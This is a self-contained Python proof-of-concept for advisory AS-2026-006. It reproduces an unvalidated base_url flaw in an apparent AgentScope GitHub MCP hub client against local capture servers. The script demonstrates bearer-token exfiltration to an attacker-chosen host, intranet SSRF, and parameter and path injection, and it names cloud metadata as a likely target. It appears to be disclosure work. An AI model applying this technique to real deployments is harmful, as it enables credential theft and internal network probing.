# -*- coding: utf-8 -*-
"""AS-2026-006 — GitHubMCPHub._request(): self-contained proof of all four effects.

Runs WITHOUT an AgentScope installation, so any reviewer can execute it in one
command. It re-executes the vulnerable request construction exactly as it
appears in `src/agentscope/app/hub/_mcp/_github_hub.py` (sink L196-200,
credential header L189-190, taint L142-143 — see screenshots 01 and 02) and
drives it against a local capture endpoint that stands in for the
attacker-controlled registry mirror.

    python poc/exp_logic.py

Observed effects (all measured, no network beyond loopback):

    EFFECT1_TOKEN_EXFIL         the deployment token arrives at a host chosen
                                by `base_url`, as `Authorization: Bearer ...`
    EFFECT2_INTRANET_SSRF       the client GETs an address the caller chose
    EFFECT3_PARAM_INJECTION     `params` / `path` reach the wire unmodified
    EFFECT4_PURE_SSRF_NO_TOKEN  with no token configured the GET still leaves

`exp_github_hub.py` is the counterpart that drives an *unmodified* AgentScope
Agent Service over its documented REST API; this file is the minimal,
dependency-light reproduction of the same defect.

Testing was performed against self-owned services only.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from capture_server import CaptureServer, free_port  # noqa: E402

try:
    import httpx
    HAVE_HTTPX = True
except ImportError:  # pragma: no cover - stdlib fallback
    import urllib.error
    import urllib.parse
    import urllib.request
    HAVE_HTTPX = False

CANARY_TOKEN = "ghp_CANARY_REDACTED_TOKEN"
INJECTED_CURSOR = "CURSOR-INJECTED-BY-ATTACKER"
INJECTED_CARD_ID = "CARD-ID-INJECTED-BY-ATTACKER"


# --------------------------------------------------------------------------
# The vulnerable logic, transcribed from _github_hub.py (AgentScope 2.0.11).
# Upstream is async (`httpx.AsyncClient`); the URL/header construction — which
# is the defect — is identical here.
# --------------------------------------------------------------------------
class GitHubMCPHubVulnerable:
    """Mirror of `agentscope.app.hub.GitHubMCPHub`'s request path."""

    DEFAULT_BASE_URL = "https://api.mcp.github.com"

    def __init__(self, base_url=DEFAULT_BASE_URL, api_token=None, timeout=30.0):
        self.base_url = base_url.rstrip("/")          # L142 — taint, unvalidated
        self.api_token = api_token                    # L143
        self.timeout = timeout
        self._client = None

    def _request(self, path, params=None):            # L170
        headers = {"Accept": "application/json"}
        if self.api_token:                            # L188-190
            headers["Authorization"] = f"Bearer {self.api_token}"
        if self._client is None:                      # L193-195
            self._client = (httpx.Client(timeout=self.timeout)
                            if HAVE_HTTPX else None)
        url = f"{self.base_url}{path}"                # L196-197 — sink
        if HAVE_HTTPX:
            r = self._client.get(url, params=params, headers=headers)
            code, text = r.status_code, r.text
        else:  # stdlib fallback: same URL, same headers, no target validation
            qs = ("?" + urllib.parse.urlencode(params or {})) if params else ""
            req = urllib.request.Request(url + qs, headers=headers)
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({}))
            try:
                with opener.open(req, timeout=self.timeout) as r:
                    code, text = r.status, r.read().decode("utf-8", "ignore")
            except urllib.error.HTTPError as e:
                code, text = e.code, e.read().decode("utf-8", "ignore")
        if code >= 400:                               # L201-206
            raise RuntimeError("HubError: %s %s" % (code, text[:120]))
        return code, text

    def list_mcps(self, user_id=None, q=None, cursor=None, limit=20):
        params = {"limit": limit}
        if q:
            params["q"] = q
        if cursor:
            params["cursor"] = cursor
        return self._request("/v0/servers", params=params)

    def get_mcp(self, card_id):
        return self._request("/v0/servers/%s" % card_id)


# --------------------------------------------------------------------------
def main():
    print("AS-2026-006 · GitHubMCPHub._request() — local reproduction")
    print("httpx available: %s\n" % HAVE_HTTPX)

    mirror = CaptureServer(free_port(18721), "REGISTRY-MIRROR").start()
    intra = CaptureServer(free_port(18722), "INTRANET-PROBE").start(
        host=os.environ.get("EXP_LANIP", "127.0.0.1"))
    try:
        # ---- EFFECT 1 + EFFECT 3 : token exfiltration + parameter injection --
        hub = GitHubMCPHubVulnerable(
            base_url="http://127.0.0.1:%d" % mirror.port,
            api_token=CANARY_TOKEN,
        )
        try:
            hub.list_mcps(q="markdown", cursor=INJECTED_CURSOR, limit=7)
        except RuntimeError as e:
            print("[1+3] list_mcps -> %s" % str(e)[:70])
        mirror.wait(1, 20)

        # ---- EFFECT 3 : path injection (card_id interpolated into the path) --
        try:
            hub.get_mcp(INJECTED_CARD_ID)
        except RuntimeError as e:
            print("[1+3] get_mcp    -> %s" % str(e)[:70])

        print()
        mirror.dump("REGISTRY MIRROR (attacker-controlled —— captured Token exfiltration)")
        paths = [h["path"] for h in mirror.hits]
        auths = [h["auth"] for h in mirror.hits]
        token_ok = any(a.startswith("Bearer ") for a in auths)
        params_ok = any(INJECTED_CURSOR in p for p in paths)
        path_ok = any(INJECTED_CARD_ID in p for p in paths)
        print()
        print("[VERDICT] EFFECT1_TOKEN_EXFIL = %s (%s)"
              % (token_ok, auths[0] if auths else "none"))
        print("[VERDICT] EFFECT3_PARAM_INJECTION = %s (cursor in query: %s, "
              "card_id in path: %s)" % (params_ok and path_ok, params_ok, path_ok))

        # ---- EFFECT 2 + EFFECT 4 : intranet SSRF, and SSRF without a token ---
        print()
        print("[setup] hub -> %s:%d (no token configured)"
              % (intra.host, intra.port))
        hub_intra = GitHubMCPHubVulnerable(
            base_url="http://%s:%d" % (intra.host, intra.port),
            api_token=None,
        )
        try:
            hub_intra.list_mcps(q="intranet-probe", limit=3)
        except RuntimeError as e:
            print("[2+4] list_mcps -> %s" % str(e)[:70])
        intra.wait(1, 20)

        print()
        intra.dump("INTRANET PROBE (GET issued by the server toward the intranet)")
        print()
        ssrf_ok = len(intra.hits) > 0
        no_auth = bool(intra.hits) and all(not h["auth"] for h in intra.hits)
        print("[VERDICT] EFFECT2_INTRANET_SSRF = %s" % ssrf_ok)
        print("[VERDICT] EFFECT4_PURE_SSRF_NO_TOKEN = %s "
              "(GET still issued, no Authorization header)" % (ssrf_ok and no_auth))

        print()
        print("[note] Cloud metadata (169.254.169.254): reachable through the "
              "same chain [Likely] —— _request() validates no target address, "
              "so httpx connects to any IP. A local probe stands in for it here.")

        verdict = token_ok and params_ok and path_ok and ssrf_ok and no_auth
        print()
        print("[VERDICT] EXP_SUCCESS = %s" % verdict)
        print(json.dumps({
            "effect1_token_exfil": token_ok,
            "effect2_intranet_ssrf": ssrf_ok,
            "effect3_param_injection": params_ok and path_ok,
            "effect4_pure_ssrf_no_token": ssrf_ok and no_auth,
        }, indent=2))
        return 0 if verdict else 1
    finally:
        mirror.stop()
        intra.stop()


if __name__ == "__main__":
    raise SystemExit(main())
